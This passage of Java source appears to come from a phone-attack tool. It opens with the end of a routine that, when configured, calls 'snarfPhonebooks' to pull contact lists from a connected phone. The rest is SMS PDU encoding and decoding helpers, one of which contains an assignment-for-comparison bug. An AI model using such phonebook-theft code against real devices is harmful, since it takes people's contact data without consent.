					attackOK=false;
				}
			} 
			
			// do the attack with the configured features
			if (attackOK && confAttackPhonebookSnarf) {
				try {
					print(snarfPhonebooks(is, os));
				} catch (Exception e) {
					attackOK=false;
				}		
			}
			
			// close input- and output connection 

			try {
				os.close();
				is.close();
			} catch (IOException e) {
				//ignored
			}

			// close stream connection
			try {
				con.close();
			} catch (Exception e) {
				//ignored		
			}

			try {
				sleep(20000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			
			if (attackOK) {
				this.attackListener.attackCompleted(1);
			} else {
				this.attackListener.attackCompleted(0);
			}
		}
	}

	private class SMSTool {

	  /**
	   * Convert a char array to a string
	   * @param test character array
	   * @return string
	   */
	  public String convertCharArray2String(char[] chararray) {
	    int i, l;
	    String text = new String();

	    l = chararray.length;
	    for (i = 0; i < l; i++) {
	      text = text + chararray[i];
	    } // for

	    return text;
	  } // convertChar2String

	  /**
	   * Create the main part part of a PDU, for sending via AT commands to
	   * the mobile phone. The mobile phone complete this part of a PDU with
	   * some data of the mobile phone and sends it then to the base station.
	   * @param number dialing number
	   * @param numbertype national/international dialing number
	   * @param message message to send (SMS)
	   * @return PDU
	   */
	  public byte[] getPDUPart(String number, boolean numbertype, String message) {
	    byte[] pdu;
	    byte[] no = convertDialNumber(number);
	    byte[] msg = compress(convertUnicode2GSM(message));
	    int l = no.length;
	    int m = msg.length;
	    pdu = new byte[4 + l + 4 + m];

	    pdu[0] = 0x11;                      // message flags
	    pdu[1] = 0x00;                      // message reference number with default value

	    pdu[2] = (byte)number.length();     // set length of dialing number
	    if (numbertype = TOA_NATIONAL)
	      pdu[3] = (byte)0x81;              // indicator for a national number
	    else
	      pdu[3] = (byte)0x91;              // indicator for a international number
	    System.arraycopy(no, 0, pdu, 4, l); // set dialing number

	    pdu[4 + l] = 0x00;                  // protocol identifier with GSM 03.40 default value
	    pdu[4 + l + 1] = 0x00;              // data coding scheme, use GSM 03.38 character set (= default value)
	    pdu[4 + l + 2] = (byte)0xAA;        // message validity period = 4 days

	    // message (= SMS content)
	    pdu[4 + l + 3] = (byte)message.length();      // set length of message
	    System.arraycopy(msg, 0, pdu, 4 + l + 4, m);  // set message

	    return pdu;
	  }  // getPDUPart

	  /**
	   * Convert a dialing number into the GSM format
	   * @param number dialing number
	   * @return coded dialing number
	   */
	  public byte[] convertDialNumber(String number) {
	    int l = number.length();
	    int j = 0;  // index in addr
	    int n;      // length of converted dial number
	    byte[] data;

	    // calculate length of converted dialing number
	    n = l / 2;
	    if (l % 2 != 0) {
	      n++;
	    }
	    data = new byte[n];
	    for (int i = 0; i < n; i++) {
	      switch (number.charAt(j)) {
	        case '0': data[i] += 0x00; break;
	        case '1': data[i] += 0x01; break;
	        case '2': data[i] += 0x02; break;
	        case '3': data[i] += 0x03; break;
	        case '4': data[i] += 0x04; break;
	        case '5': data[i] += 0x05; break;
	        case '6': data[i] += 0x06; break;
	        case '7': data[i] += 0x07; break;
	        case '8': data[i] += 0x08; break;
	        case '9': data[i] += 0x09; break;
	      } // switch
	      if (j + 1 < l) {
	        switch (number.charAt(j + 1)) {
	          case '0': data[i] += 0x00; break;
	          case '1': data[i] += 0x10; break;
	          case '2': data[i] += 0x20; break;
	          case '3': data[i] += 0x30; break;
	          case '4': data[i] += 0x40; break;
	          case '5': data[i] += 0x50; break;
	          case '6': data[i] += 0x60; break;
	          case '7': data[i] += 0x70; break;
	          case '8': data[i] += 0x80; break;
	          case '9': data[i] += 0x90; break;
	        } // switch
	      } // if
	      else {
	        data[i] += 0xF0;
	      } // else
	      j += 2;
	    }  // for
	    return data;
	  } // convertDialNumber

	  /**
	   * Convert the address field (dialing number) from the GSM format
	   * @param number dialing number
	   * @return decoded dialing number
	   */
	  public String decodeAddressField(String number) {
	    int len;      // length of originating adress
	    int n;        // length of converted dial number
	    String s, orgAdr="";

	    s = number.substring(0, 2);         // get raw length [digits] of originating adress
	    len = Integer.parseInt(s, 16);      // calculate length [digits] of originating adress
	    number = number.substring(2, number.length());

	    s = number.substring(0, 2);         // get raw length [digits] of originating adress
	    if (s.compareTo("91") == 0) {
	      orgAdr = "+";
	      number = number.substring(2, number.length());
	    } // if

	    //----- digit swap procedure for the number
	    n = 0;
	    if (len % 2 != 0) {
	      number = number.substring(0, number.length()-1);  // shorten number in case of wrong number format
	    } // if
	    do {
	      orgAdr += number.substring(n+1, n+2) + number.substring(n, n+1);
	      n += 2;
	    } while (n < number.length());

	    return orgAdr;
	  } // decodeAddressField

	  /**
	   * Convert a Unicode text string into the GSM standard alphabet
	   * @param msg text string in ASCII
	   * @return text string in GSM standard alphabet
	   */
	  public byte[] convertUnicode2GSM(String msg) {
	    byte[] data = new byte[msg.length()];

	    for (int i = 0; i < msg.length(); i++) {
	      switch (msg.charAt(i)) {
	        case '@':  data[i] = 0x00; break;
	        case '$':  data[i] = 0x02; break;
	        case '\n': data[i] = 0x0A; break;
	        case '\r': data[i] = 0x0D; break;
	        case '_':  data[i] = 0x11; break;
	        //case '?':  data[i] = 0x1E; break;
	        case ' ':  data[i] = 0x20; break;
	        case '!':  data[i] = 0x21; break;
	        case '\"': data[i] = 0x22; break;
	        case '#':  data[i] = 0x23; break;
	        case '%':  data[i] = 0x25; break;
	        case '&':  data[i] = 0x26; break;
	        case '\'': data[i] = 0x27; break;
	        case '(':  data[i] = 0x28; break;
	        case ')':  data[i] = 0x29; break;
	        case '*':  data[i] = 0x2A; break;
	        case '+':  data[i] = 0x2B; break;
	        case ',':  data[i] = 0x2C; break;
	        case '-':  data[i] = 0x2D; break;
	        case '.':  data[i] = 0x2E; break;
	        case '/':  data[i] = 0x2F; break;
	        case '0':  data[i] = 0x30; break;
	        case '1':  data[i] = 0x31; break;
	        case '2':  data[i] = 0x32; break;
	        case '3':  data[i] = 0x33; break;
	        case '4':  data[i] = 0x34; break;
	        case '5':  data[i] = 0x35; break;
	        case '6':  data[i] = 0x36; break;
	        case '7':  data[i] = 0x37; break;
	        case '8':  data[i] = 0x38; break;
	        case '9':  data[i] = 0x39; break;
	        case ':':  data[i] = 0x3A; break;
	        case ';':  data[i] = 0x3B; break;
	        case '<':  data[i] = 0x3C; break;
	        case '=':  data[i] = 0x3D; break;
	        case '>':  data[i] = 0x3E; break;
	        case '?':  data[i] = 0x3F; break;
	        case 'A':  data[i] = 0x41; break;
	        case 'B':  data[i] = 0x42; break;
	        case 'C':  data[i] = 0x43; break;
	        case 'D':  data[i] = 0x44; break;
	        case 'E':  data[i] = 0x45; break;
	        case 'F':  data[i] = 0x46; break;
	        case 'G':  data[i] = 0x47; break;
	        case 'H':  data[i] = 0x48; break;
	        case 'I':  data[i] = 0x49; break;
	        case 'J':  data[i] = 0x4A; break;
	        case 'K':  data[i] = 0x4B; break;
	        case 'L':  data[i] = 0x4C; break;
	        case 'M':  data[i] = 0x4D; break;
	        case 'N':  data[i] = 0x4E; break;
	        case 'O':  data[i] = 0x4F; break;
	        case 'P':  data[i] = 0x50; break;
	        case 'Q':  data[i] = 0x51; break;
	        case 'R':  data[i] = 0x52; break;
	        case 'S':  data[i] = 0x53; break;
	        case 'T':  data[i] = 0x54; break;
	        case 'U':  data[i] = 0x55; break;
	        case 'V':  data[i] = 0x56; break;
	        case 'W':  data[i] = 0x57; break;
	        case 'X':  data[i] = 0x58; break;
	        case 'Y':  data[i] = 0x59; break;
	        case 'Z':  data[i] = 0x5A; break;
//	        case '?':  data[i] = 0x5B; break;
//	        case '?':  data[i] = 0x5C; break;
//	        case '?':  data[i] = 0x5E; break;
//	        case '?':  data[i] = 0x5F; break;
	        case 'a':  data[i] = 0x61; break;
	        case 'b':  data[i] = 0x62; break;
	        case 'c':  data[i] = 0x63; break;
	        case 'd':  data[i] = 0x64; break;
	        case 'e':  data[i] = 0x65; break;
	        case 'f':  data[i] = 0x66; break;
	        case 'g':  data[i] = 0x67; break;
	        case 'h':  data[i] = 0x68; break;
	        case 'i':  data[i] = 0x69; break;
	        case 'j':  data[i] = 0x6A; break;
	        case 'k':  data[i] = 0x6B; break;
	        case 'l':  data[i] = 0x6C; break;
	        case 'm':  data[i] = 0x6D; break;
	        case 'n':  data[i] = 0x6E; break;
	        case 'o':  data[i] = 0x6F; break;
	        case 'p':  data[i] = 0x70; break;
	        case 'q':  data[i] = 0x71; break;
	        case 'r':  data[i] = 0x72; break;
	        case 's':  data[i] = 0x73; break;
	        case 't':  data[i] = 0x74; break;
	        case 'u':  data[i] = 0x75; break;
	        case 'v':  data[i] = 0x76; break;
	        case 'w':  data[i] = 0x77; break;
	        case 'x':  data[i] = 0x78; break;
	        case 'y':  data[i] = 0x79; break;
	        case 'z':  data[i] = 0x7A; break;
//	        case '?':  data[i] = 0x7B; break;
//	        case '?':  data[i] = 0x7C; break;
//	        case '?':  data[i] = 0x7E; break;
	        default:   data[i] = 0x3F; break;  // found unknown character -> '?'
	      }  // switch
	    }  // for
	    return data;
	  }  // convertUnicode2GSM

	   /**
	   * Convert one GSM standard alphabet character into a Unicode character
	   * @param b one GSM standard alphabet character
	   * @return one Unicode character
	   */
	  public char convertGSM2Unicode(int b) {
	    char c;

	    if ((b >= 0x41) && (b <= 0x5A)) {    // character is between "A" and "Z"
	      c = (char) b;
	      return c;
	    }  // if
	    if ((b >= 0x61) && (b <= 0x7A)) {    // character is between "a" and "z"
	      c = (char) b;
	      return c;
	    }  // if
	    if ((b >= 0x30) && (b <= 0x39)) {    // character is between "0" and "9"
	      c = (char) b;
	      return c;
	    }  // if

	    switch (b) {
	      case 0x00 : c = '@'; break;
	      case 0x02 : c = '$'; break;
	      case 0x0A : c = '\n'; break;
	      case 0x0D : c = '\r'; break;
	      case 0x11 : c = '_'; break;
	      case 0x1E : c = '?'; break;
	      case 0x20 : c = ' '; break;
	      case 0x21 : c = '!'; break;
	      case 0x22 : c = '\"'; break;
	      case 0x23 : c = '#'; break;
	      case 0x25 : c = '%'; break;
	      case 0x26 : c = '&'; break;
	      case 0x27 : c = '\''; break;
	      case 0x28 : c = '('; break;
	      case 0x29 : c = ')'; break;
	      case 0x2A : c = '*'; break;
	      case 0x2B : c = '+'; break;
	      case 0x2C : c = ','; break;
	      case 0x2D : c = '-'; break;
	      case 0x2E : c = '.'; break;
	      case 0x2F : c = '/'; break;
	      case 0x3A : c = ':'; break;
	      case 0x3B : c = ';'; break;
	      case 0x3C : c = '<'; break;
	      case 0x3D : c = '='; break;
	      case 0x3E : c = '>'; break;
	      case 0x3F : c = '?'; break;
	      case 0x5B : c = '?'; break;
	      case 0x5C : c = '?'; break;
	      case 0x5E : c = '?'; break;
	      case 0x5F : c = '?'; break;
	      case 0x7B : c = '?'; break;
	      case 0x7C : c = '?'; break;
	      case 0x7E : c = '?'; break;
	      default:    c = ' '; break;
	    }  // switch
	    return c;
	  }  // convertGSM2Unicode

	  /**
	   * Compress a readable text message into the GSM standard alphabet
	   * (1 character -> 7 bit data)
	   * @param data text string in Unicode
	   * @return text string in GSM standard alphabet
	   */
	  public byte[] compress(byte[] data) {
	    int l;
	    int n;  // length of compressed data
	    byte[] comp;

	    // calculate length of message
	    l = data.length;
	    n = (l * 7) / 8;
	    if ((l * 7) % 8 != 0) {
	      n++;
	    }  // if

	    comp = new byte[n];
	    int j = 0;   // index in data
	    int s = 0;   // shift from next data byte
	    for (int i = 0; i < n; i++) {
	      comp[i] = (byte)((data[j] & 0x7F) >>> s);
	      s++;
	      if (j + 1 < l) {
	        comp[i] += (byte)((data[j + 1] << (8 - s)) & 0xFF);
	      }  // if
	      if (s < 7) {
	        j++;
	      }  // if
	      else  {
	        s = 0;
	        j += 2;
	      }  // else
	    } // for
	    return comp;
	  }  // compress


	  public String getSMSText(String data) {
	    int i, x, n;
	    String s, date="", time="", timezone="", orgnumber="";

	    // System.out.println(data);          // output for debuging
	    s = data.substring(0, 2);          // get length [byte] of delivering SMSC number
	    x = Integer.parseInt(s, 16);       // calculate length [byte] of delivering SMSC number
	    s = data.substring(0, 2+x*2);      // get raw delivering SMSC number, this line is optional for debugging reasons

	    i = 2 + x * 2;                     // set index to message header flags
	    s = data.substring(i, i+2);        // get message header flags

	    i = i + 2;                         // set index to length [digits] of originating adress
	    s = data.substring(i, i+2);        // get length [digits] of originating adress
	    x = Integer.parseInt(s, 16);       // calculate length [digits] of originating adress
	    s = data.substring(i+3, i+4);      // get type of number
	    if (s.compareTo("1") == 0) {       // it is a national (0x81) or  international (0x91) number
	      s = data.substring(i, i+x+4);    // get raw originating adress, this line is optional for debugging reasons
	      orgnumber = decodeAddressField(s);
	    } // if
	    else {                             // it is a unknown type of number
	      s = data.substring(i, i+2) + data.substring(i+4, i+4+x);    // get raw originating adress, this line is optional for debugging reasons
	      orgnumber = decodeAddressField(s);
	    } // else

	    i = i + 6 + x;                // set index to data coding scheme
	    s = data.substring(i, i+2);   // get raw data coding scheme, this line is optional for debugging reasons

	    //----- get data, time and time zone
	    i = i + 2;                     // set index to date and time (= TP-Service-Centre-Time-Stamp (TP-SCTS))
	    s = data.substring(i, i+14);   // get raw date and time, this line is optional for debugging reasons

	    date = s.substring(1, 2) + s.substring(0, 1) ;                 // get year
	    date = s.substring(3, 4) + s.substring(2, 3) + "." + date;     // get month
	    date = s.substring(5, 6) + s.substring(4, 5) + "." + date;     // get day

	    time = s.substring(11, 12) + s.substring(10, 11);              // get hour
	    time = s.substring(9,  10) + s.substring(8,   9) + ":" + time; // get minute
	    time = s.substring(7,   8) + s.substring(6,   7) + ":" + time; // get second

	    timezone = s.substring(13, 14) + s.substring(12, 13);          // get time zone

	    i = i + 14;                                // set index to length of user data (=SMS)
	    s = data.substring(i, i+2);                // get length of user data (=SMS)
	    x = Integer.parseInt(s, 16);               // calculate length [characters] of user data (=SMS)
	    data = data.substring(i+2, data.length()); // delete the transport information at the beginning of the PDU

	    //----- copy SMS from a string into a byte array to prepare convertion to Unicode
	    byte sms[] = new byte[data.length()/2];
	    for (n = 0; n < data.length()/2; n++) {
	      s = data.substring(n*2, n*2+2);
	      sms[n] = (byte)(0x000000FF & Integer.parseInt(s, 16));
	    }  // for
	    data = expand(sms);

	    //----- put all informations together
	    data = orgnumber + " " + date + " " + time + " +" + timezone + " " + SMSTEXTSIGN + data;
	    return data;
	  }  // getSMSText

	  /**
	   * Expands a compressed GSM message in a readable text message
	   * (7 bit data -> 1 character)
	   * @param indata text string in GSM standard alphabet
	   * @return text string in Unicode
	   */
	  public String expand(byte[] indata) {
	    int x, n, y, Bytebefore, Bitshift;
	    String msg = new String("");
	    byte data[] = new byte[indata.length+1];

	    for (n = 1; n < data.length; n++) {
	      data[n] = indata[n-1];
	    } // for

	    Bytebefore = 0;
	    for (n = 1; n < data.length; n++) {
	      x = (int) (0x000000FF & data[n]);   // get a byte from the SMS
	      Bitshift = (n-1) % 7;               // calculate number of neccssary bit shifts
	      y = x;
	      y = y << Bitshift;                  // shift to get a conversion 7 bit compact GSM -> Unicode
	      y = y | Bytebefore;                 // add bits from the byte before this byte
	      y = y & 0x0000007F;                 // delete all bits except bit 7 ... 1 of the byte
	      msg = msg + convertGSM2Unicode(y);  // conversion: 7 bit GSM character -> Unicode
	      if (Bitshift == 6) {
	        Bitshift = 1;
	        y = x;
	        y = y >>> Bitshift;                 // shift to get a conversion 7 bit compact GSM -> Unicode
	        y = y & 0x0000007F;                 // delete all bits except bit 7 ... 1 of the byte
	        msg = msg + convertGSM2Unicode(y);  // conversion: 7 bit GSM character -> Unicode
	        Bytebefore = 0;
	      }  // if
	      else {
	        Bytebefore = x;
	        Bitshift = 7 - Bitshift;
	        Bytebefore = Bytebefore >>> Bitshift;  // shift to get a conversion 7 bit compact GSM -> Unicode
	        Bytebefore = Bytebefore & 0x000000FF;  // mask for one byte
	      }  // else
	    }  // for
	    return msg;
	  }  // expand


	  /**
	   * Convert data into a hex string
	   * @param data to convert
	   * @return in hex string converted data
	   */
	  public char[] toHexString(byte[] data) {
	    int l = data.length;
	    char[] hex = new char[2 * l];

	    int j = 0; // index in hex
	    for (int i = 0; i < data.length; i++) {
	      switch (data[i] & 0xF0) {
	        case 0x00: hex[j] = '0'; break;
	        case 0x10: hex[j] = '1'; break;
	        case 0x20: hex[j] = '2'; break;
	        case 0x30: hex[j] = '3'; break;
	        case 0x40: hex[j] = '4'; break;
	        case 0x50: hex[j] = '5'; break;
	        case 0x60: hex[j] = '6'; break;
	        case 0x70: hex[j] = '7'; break;
	        case 0x80: hex[j] = '8'; break;
	        case 0x90: hex[j] = '9'; break;
	        case 0xA0: hex[j] = 'A'; break;
	        case 0xB0: hex[j] = 'B'; break;
	        case 0xC0: hex[j] = 'C'; break;
	        case 0xD0: hex[j] = 'D'; break;
	        case 0xE0: hex[j] = 'E'; break;
	        case 0xF0: hex[j] = 'F'; break;
	      } // switch
	      j++;
	      switch (data[i] & 0x0F) {
	        case 0x00: hex[j] = '0'; break;
	        case 0x01: hex[j] = '1'; break;
	        case 0x02: hex[j] = '2'; break;
	        case 0x03: hex[j] = '3'; break;
	        case 0x04: hex[j] = '4'; break;
	        case 0x05: hex[j] = '5'; break;
	        case 0x06: hex[j] = '6'; break;
	        case 0x07: hex[j] = '7'; break;
	        case 0x08: hex[j] = '8'; break;
	        case 0x09: hex[j] = '9'; break;
	        case 0x0A: hex[j] = 'A'; break;
	        case 0x0B: hex[j] = 'B'; break;
	        case 0x0C: hex[j] = 'C'; break;
	        case 0x0D: hex[j] = 'D'; break;
	        case 0x0E: hex[j] = 'E'; break;
	        case 0x0F: hex[j] = 'F'; break;
	      } // switch
	      j++;
	    }  // for
	    return hex;
	  } // toHexString

	} // SMSTool
}
